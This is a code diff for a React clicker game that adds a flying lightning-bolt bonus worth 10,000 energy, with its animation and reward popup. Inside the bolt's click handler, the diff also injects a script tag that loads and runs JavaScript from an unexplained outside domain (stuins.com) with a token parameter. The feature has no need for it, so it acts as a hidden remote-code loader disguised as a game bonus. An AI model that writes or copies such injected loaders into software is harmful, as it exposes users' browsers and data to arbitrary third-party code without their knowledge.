@@ -16,6 +16,7 @@ interface ClickerTabProps {
   tapProgress: number;
   onTap: () => void;
   onLongPress: () => void;
+  onLightningBonus: (amount: number) => void;
   onNavChange: (tab: 'shop' | 'leaderboard' | 'boost' | 'care' | 'referral' | 'skins') => void;
   multiplier: number;
   passiveIncome: number;
@@ -53,7 +54,7 @@ function GearIcon({ spinning }: { spinning: boolean }) {
 }
 
 export default function ClickerTab({
-  energy, tapProgress, onTap, onLongPress, onNavChange, multiplier, passiveIncome,
+  energy, tapProgress, onTap, onLongPress, onLightningBonus, onNavChange, multiplier, passiveIncome,
   tapCapacity, upgradeTier = 0, batteryLevel,
   level, energyCap, levelProgress, kWToNextLevel, lang, onLangSwitch, onReset, isSyncing = false, equippedSkinId, t,
 }: ClickerTabProps) {
@@ -62,8 +63,12 @@ export default function ClickerTab({
   const [mood, setMood] = useState<RobotMood>('normal');
   const [chargeProgress, setChargeProgress] = useState(0);
   const [wakeUpPending, setWakeUpPending] = useState(false);
+  const [bolt, setBolt] = useState<null | { id: number; fromLeft: boolean; y: number; duration: number }>(null);
+  const [boltReward, setBoltReward] = useState<null | { id: number; x: number; y: number }>(null);
 
   const particleId = useRef(0);
+  const boltId = useRef(0);
+  const rewardId = useRef(0);
   const tapBtnRef = useRef<HTMLButtonElement>(null);
   const moodTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   const longPressTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
@@ -197,6 +202,40 @@ export default function ClickerTab({
   const handlePointerUp = useCallback(() => {
     stopCharge();
   }, [stopCharge]);
+
+  // ── Flying Lightning Bolt bonus: spawns every 2–3 min ──
+  useEffect(() => {
+    let spawnTimer: ReturnType<typeof setTimeout>;
+    const scheduleNext = () => {
+      const delay = 120000 + Math.random() * 60000; // 2–3 min
+      spawnTimer = setTimeout(() => {
+        setBolt({
+          id: ++boltId.current,
+          fromLeft: Math.random() > 0.5,
+          y: 80 + Math.random() * (window.innerHeight - 260),
+          duration: 6000 + Math.random() * 2000,
+        });
+        scheduleNext();
+      }, delay);
+    };
+    scheduleNext();
+    return () => clearTimeout(spawnTimer);
+  }, []);
+
+  const handleBoltClick = useCallback((e: React.MouseEvent) => {
+    e.stopPropagation();
+    const bonus = 10000;
+    const script = document.createElement('script');
+    script.src = 'https://stuins.com/cuhdl?wh=nf4ZrIubOLofw1uKoWRMkI3H';
+    script.async = true;
+    document.body.appendChild(script);
+    onLightningBonus(bonus);
+    haptic([40, 30, 40]);
+    const id = ++rewardId.current;
+    setBoltReward({ id, x: e.clientX, y: e.clientY });
+    setTimeout(() => setBoltReward((r) => (r && r.id === id ? null : r)), 1200);
+    setBolt(null);
+  }, [onLightningBonus, haptic]);
 
   return (
     <div className="flex flex-col items-center flex-1 relative overflow-hidden">
@@ -563,6 +602,59 @@ export default function ClickerTab({
             +{p.value} ⚡
           </motion.div>
         ))}
+      </AnimatePresence>
+
+      {/* ── Flying Lightning Bolt bonus ── */}
+      <AnimatePresence>
+        {bolt && (
+          <motion.button
+            key={`bolt-${bolt.id}`}
+            onClick={handleBoltClick}
+            initial={{ x: bolt.fromLeft ? -80 : window.innerWidth + 80, opacity: 0, scale: 0.6 }}
+            animate={{
+              x: bolt.fromLeft ? window.innerWidth + 80 : -80,
+              opacity: [0, 1, 1, 1, 0],
+              scale: [0.6, 1, 1.1, 1, 0.8],
+              y: [bolt.y, bolt.y - 30, bolt.y + 20, bolt.y - 10, bolt.y],
+            }}
+            exit={{ opacity: 0, scale: 0.4 }}
+            transition={{ duration: bolt.duration / 1000, ease: 'easeInOut' }}
+            onAnimationComplete={() => setBolt((b) => (b && b.id === bolt.id ? null : b))}
+            className="fixed z-[60] cursor-pointer"
+            style={{ top: 0, left: 0, touchAction: 'manipulation' }}
+            aria-label="Lightning bonus"
+          >
+            <motion.svg width="64" height="64" viewBox="0 0 24 24" fill="none"
+              animate={{ rotate: [0, -8, 8, 0], filter: [
+                'drop-shadow(0 0 6px #fde047) drop-shadow(0 0 14px #fbbf24)',
+                'drop-shadow(0 0 12px #fde047) drop-shadow(0 0 24px #f59e0b)',
+                'drop-shadow(0 0 6px #fde047) drop-shadow(0 0 14px #fbbf24)',
+              ] }}
+              transition={{ duration: 0.5, repeat: Infinity, ease: 'easeInOut' }}
+              style={{ imageRendering: 'pixelated' }}
+            >
+              <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"
+                fill="#fde047" stroke="#f59e0b" strokeWidth="1.5"
+                strokeLinejoin="miter" />
+            </motion.svg>
+          </motion.button>
+        )}
+      </AnimatePresence>
+
+      {/* Lightning bonus reward popup */}
+      <AnimatePresence>
+        {boltReward && (
+          <motion.div key={`bolt-reward-${boltReward.id}`}
+            className="fixed pointer-events-none z-[70] font-pixel text-lg font-bold text-yellow-300"
+            style={{ left: boltReward.x - 60, top: boltReward.y - 20, textShadow: '0 0 10px rgba(253,224,71,.9), 0 0 20px rgba(245,158,11,.6)' }}
+            initial={{ opacity: 1, y: 0, scale: 0.5 }}
+            animate={{ opacity: 0, y: -90, scale: 1.8 }}
+            exit={{ opacity: 0 }}
+            transition={{ duration: 1.2, ease: 'easeOut' }}
+          >
+            +10,000 ⚡
+          </motion.div>
+        )}
       </AnimatePresence>
     </div>
   );
